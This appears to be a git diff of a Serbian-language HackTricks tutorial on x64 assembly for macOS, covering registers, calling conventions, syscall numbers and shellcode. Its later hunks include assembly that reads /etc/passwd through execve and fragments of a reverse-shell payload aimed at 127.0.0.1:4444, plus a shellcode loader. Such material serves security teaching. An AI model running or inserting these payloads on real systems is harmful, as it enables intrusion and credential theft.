@@ -1,86 +1,88 @@
-# Uvod u x64
+# Увод у x64
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## **Uvod u x64**
+## **Увод у x64**
 
-x64, poznat i kao x86-64, je arhitektura procesora od 64 bita koja se uglavnom koristi u desktop i serverskom računarstvu. Potiče od x86 arhitekture proizvedene od strane Intela, a kasnije je usvojena od strane AMD-a pod imenom AMD64, i danas je dominantna arhitektura u ličnim računarima i serverima.
+x64, познат и као x86-64, је 64-битна архитектура процесора која се превасно користи у десктоп и серверском рачунарству. Потиче из x86 архитектуре коју је произвео Intel, а касније је усвојила AMD под именом AMD64, и данас је преовлађујућа архитектура у личним рачунарима и серверима.
 
-### **Registri**
+### **Регистри**
 
-x64 proširuje x86 arhitekturu, uključujući **16 registara opšte namene** označenih kao `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, i `r8` do `r15`. Svaki od njih može čuvati vrednost od **64 bita** (8 bajtova). Ovi registri takođe imaju 32-bitne, 16-bitne i 8-bitne pod-registre radi kompatibilnosti i specifičnih zadataka.
+x64 се проширује на x86 архитектуру, имајући **16 регистара опште намене** обележених `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, и `r8` до `r15`. Сваки од ових може да чува **64-битну** (8-бајтну) вредност. Ови регистри такође имају 32-битне, 16-битне и 8-битне подрегистре за компатибилност и специфичне задатке.
 
-1. **`rax`** - Tradicionalno se koristi za **vrednosti povratka** iz funkcija.
-2. **`rbx`** - Često se koristi kao **bazni registar** za operacije sa memorijom.
-3. **`rcx`** - Obično se koristi za **brojače petlji**.
-4. **`rdx`** - Koristi se u različitim ulogama uključujući proširene aritmetičke operacije.
-5. **`rbp`** - **Bazni pokazivač** za okvir steka.
-6. **`rsp`** - **Pokazivač steka**, prati vrh steka.
-7. **`rsi`** i **`rdi`** - Koriste se za **izvore** i **odredišta** indeksa u string/memorijskim operacijama.
-8. **`r8`** do **`r15`** - Dodatni registri opšte namene uvedeni u x64.
+1. **`rax`** - Традиционално се користи за **вредности повратка** из функција.
+2. **`rbx`** - Често се користи као **базни регистар** за операције са меморијом.
+3. **`rcx`** - Обично се користи за **бројаче петљи**.
+4. **`rdx`** - Користи се у разним улогама укључујући проширене аритметичке операције.
+5. **`rbp`** - **Базни показивач** за стек фрејм.
+6. **`rsp`** - **Показивач стека**, прати врх стека.
+7. **`rsi`** и **`rdi`** - Користе се за **изворне** и **одредишне** индексе у операцијама са низовима/меморијом.
+8. **`r8`** до **`r15`** - Додатни регистри опште намене уведени у x64.
 
-### **Konvencija pozivanja**
+### **Конвенција позива**
 
-Konvencija pozivanja u x64 varira između operativnih sistema. Na primer:
+Конвенција позива x64 варира између оперативних система. На пример:
 
-* **Windows**: Prva **četiri parametra** se prosleđuju u registrima **`rcx`**, **`rdx`**, **`r8`**, i **`r9`**. Dodatni parametri se guraju na stek. Vrednost povratka je u **`rax`**.
-* **System V (često korišćen u UNIX-sličnim sistemima)**: Prva **šest celobrojnih ili pokazivačkih parametara** se prosleđuju u registrima **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, i **`r9`**. Vrednost povratka je takođe u **`rax`**.
+* **Windows**: Прва **четири параметра** се преносе у регистре **`rcx`**, **`rdx`**, **`r8`**, и **`r9`**. Додатни параметри се стављају на стек. Вредност повратка је у **`rax`**.
+* **System V (обично коришћен у UNIX-подобним системима)**: Првих **шест целих или показивачких параметара** се преносе у регистре **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, и **`r9`**. Вредност повратка је такође у **`rax`**.
 
-Ako funkcija ima više od šest ulaza, **ostali će biti prosleđeni na stek**. **RSP**, pokazivač steka, mora biti **poravnan na 16 bajtova**, što znači da adresa na koju pokazuje mora biti deljiva sa 16 pre bilo kog poziva. To znači da obično moramo da se pobrinemo da je RSP pravilno poravnan u našem shell kodu pre nego što pozovemo funkciju. Međutim, u praksi, sistemski pozivi često funkcionišu čak i ako ovaj zahtev nije ispunjen.
+Ако функција има више од шест улаза, **остали ће бити пренесени на стек**. **RSP**, показивач стека, мора бити **поредио на 16 бајтова**, што значи да адреса на коју указује мора бити делива са 16 пре него што се било који позив деси. То значи да обично морамо осигурати да је RSP правилно поређен у нашем shellcode-у пре него што направимо позив функције. Међутим, у пракси, системски позиви функционишу много пута иако овај захтев није испуњен.
 
-### Konvencija pozivanja u Swift-u
+### Конвенција позива у Swift
 
-Swift ima svoju **konvenciju pozivanja** koja se može pronaći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
+Swift има своју **конвенцију позива** која се може наћи на [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
 
-### **Uobičajene instrukcije**
+### **Уобичајене инструкције**
 
-x64 instrukcije imaju bogat set, održavajući kompatibilnost sa ranijim x86 instrukcijama i uvodeći nove.
+x64 инструкције имају богат сет, одржавајући компатибилност са ранијим x86 инструкцијама и уводећи нове.
 
-* **`mov`**: **Premeštanje** vrednosti iz jednog **registra** ili **lokacije u memoriji** u drugi.
-* Primer: `mov rax, rbx` — Premešta vrednost iz `rbx` u `rax`.
-* **`push`** i **`pop`**: Guranje ili izvlačenje vrednosti sa/na **stek**.
-* Primer: `push rax` — Gura vrednost iz `rax` na stek.
-* Primer: `pop rax` — Izvlači vrh steka u `rax`.
-* **`add`** i **`sub`**: Operacije **sabiranja** i **oduzimanja**.
-* Primer: `add rax, rcx` — Sabira vrednosti u `rax` i `rcx` čuvajući rezultat u `rax`.
-* **`mul`** i **`div`**: Operacije **množenja** i **deljenja**. Napomena: ove imaju specifična ponašanja u vezi sa korišćenjem operanada.
-* **`call`** i **`ret`**: Koriste se za **pozivanje** i **vraćanje iz funkcija**.
-* **`int`**: Koristi se za pokretanje softverskog **prekida**. Na primer, `int 0x80` se koristio za sistemski poziv u 32-bitnom x86 Linux-u.
-* **`cmp`**: **Upoređuje** dve vrednosti i postavlja zastave CPU-a na osnovu rezultata.
-* Primer: `cmp rax, rdx` — Upoređuje `rax` sa `rdx`.
-* **`je`, `jne`, `jl`, `jge`, ...**: **Uslovne skok** instrukcije koje menjaju tok kontrole na osnovu rezultata prethodnog `cmp` ili testa.
-* Primer: Nakon `cmp rax, rdx` instrukcije, `je label` — Skoči na `label` ako je `rax` jednak `rdx`.
-* **`syscall`**: Koristi se za **sistemski poziv** u nekim x64 sistemima (kao što su moderni Unix sistemi).
-* **`sysenter`**: Optimizovana instrukcija za **sistemski poziv** na nekim platformama.
+* **`mov`**: **Премести** вредност из једног **регистра** или **меморијске локације** у други.
+* Пример: `mov rax, rbx` — Премешта вредност из `rbx` у `rax`.
+* **`push`** и **`pop`**: Постави или уклони вредности на/са **стека**.
+* Пример: `push rax` — Поставља вредност у `rax` на стек.
+* Пример: `pop rax` — Уклоњава врх вредности из стека у `rax`.
+* **`add`** и **`sub`**: Операције **сабирања** и **одузимања**.
+* Пример: `add rax, rcx` — Сабира вредности у `rax` и `rcx`, чувајући резултат у `rax`.
+* **`mul`** и **`div`**: Операције **мултипликације** и **делења**. Напомена: ове имају специфична понашања у вези са коришћењем операнда.
+* **`call`** и **`ret`**: Користе се за **позивање** и **враћање из функција**.
+* **`int`**: Користи се за активирање софтверског **прекида**. На пример, `int 0x80` се користио за системске позиве у 32-битном x86 Линуксу.
+* **`cmp`**: **Упоређује** две вредности и поставља флагове ЦПУ-а на основу резултата.
+* Пример: `cmp rax, rdx` — Упоређује `rax` са `rdx`.
+* **`je`, `jne`, `jl`, `jge`, ...**: **Условне скок** инструкције које мењају ток контроле на основу резултата претходне `cmp` или теста.
+* Пример: Након инструкције `cmp rax, rdx`, `je label` — Скаче на `label` ако је `rax` једнак `rdx`.
+* **`syscall`**: Користи се за **системске позиве** у неким x64 системима (као што је модерни Unix).
+* **`sysenter`**: Оптимизована **инструкција системског позива** на неким платформама.
 
-### **Prolog funkcije**
+### **Функционални пролог**
 
-1. **Guranje starog baznog pokazivača**: `push rbp` (čuva bazni pokazivač pozivaoca)
-2. **Premeštanje trenutnog pokazivača steka u bazni pokazivač**: `mov rbp, rsp` (postavlja novi bazni pokazivač za trenutnu funkciju)
-3. **Alokacija prostora na steku za lokalne promenljive**: `sub rsp, <veličina>` (gde je `<veličina>` broj bajtova potrebnih)
+1. **Постави стари базни показивач**: `push rbp` (чува базни показивач позиваоца)
+2. **Премести тренутни показивач стека у базни показивач**: `mov rbp, rsp` (поставља нови базни показивач за текућу функцију)
+3. **Алокирај простор на стеку за локалне променљиве**: `sub rsp, <size>` (где је `<size>` број бајтова који су потребни)
 
-### **Epilog funkcije**
+### **Функционални епилог**
 
-1. **Premeštanje trenutnog baznog pokazivača u pokazivač steka**: `mov rsp, rbp` (dealocira lokalne promenljive)
-2. **Izvlačenje starog baznog pokazivača sa steka**: `pop rbp` (vraća bazni pokazivač pozivaoca)
-3. **Povratak**: `ret` (vraća kontrolu pozivaocu)
+1. **Премести тренутни базни показивач у показивач стека**: `mov rsp, rbp` (ослобађа локалне променљиве)
+2. **Уклоните стари базни показивач са стека**: `pop rbp` (враћа базни показивач позиваоца)
+3. **Врати**: `ret` (враћа контролу позиваоцу)
+
 ## macOS
 
-### syscalls
+### системски позиви
 
-Postoje različite klase syscalls, možete ih **pronaći ovde**: [**ovde**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+Постоје различите класе системских позива, можете [**наћи их овде**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -89,7 +91,7 @@ Postoje različite klase syscalls, možete ih **pronaći ovde**: [**ovde**](http
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-Zatim, možete pronaći broj svakog sistemskog poziva [**na ovom linku**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+Zatim, možete pronaći svaki syscall broj [**na ovoj adresi**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -106,13 +108,13 @@ Zatim, možete pronaći broj svakog sistemskog poziva [**na ovom linku**](https:
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-Dakle, da biste pozvali `open` sistemski poziv (**5**) iz **Unix/BSD klase**, morate dodati: `0x2000000`
+Dakle, da biste pozvali `open` syscall (**5**) iz **Unix/BSD klase**, potrebno je da mu dodate: `0x2000000`
 
-Dakle, broj sistemskog poziva za pozivanje open bio bi `0x2000005`
+Dakle, broj syscall-a za pozivanje open bi bio `0x2000005`
 
-### Shellkodovi
+### Shellcodes
 
-Za kompajliranje:
+Da biste kompajlirali:
 
 {% code overflow="wrap" %}
 ```bash
@@ -121,7 +123,7 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 ```
 {% endcode %}
 
-Za izdvajanje bajtova:
+Da biste izdvojili bajtove:
 
 {% code overflow="wrap" %}
 ```bash
@@ -137,7 +139,7 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 
 <details>
 
-<summary>C kod za testiranje shell koda</summary>
+<summary>C kod za testiranje shellcode-a</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -226,9 +228,9 @@ syscall
 {% endtab %}
 {% endtabs %}
 
-#### Čitanje pomoću cat
+#### Čitajte sa cat
 
-Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, pa je drugi argument (x1) niz parametara (što u memoriji znači stek adresa).
+Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji znači stek adresa).
 ```armasm
 bits 64
 section .text
@@ -259,7 +261,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Pozivanje komande sa sh
+#### Pozovite komandu sa sh
 ```armasm
 bits 64
 section .text
@@ -376,7 +378,7 @@ syscall
 ```
 #### Reverse Shell
 
-Obrnuti shell sa [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Obrnuti shell ka **127.0.0.1:4444**
+Reverse shell sa [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell na **127.0.0.1:4444**
 ```armasm
 section .text
 global _main
@@ -438,16 +440,17 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
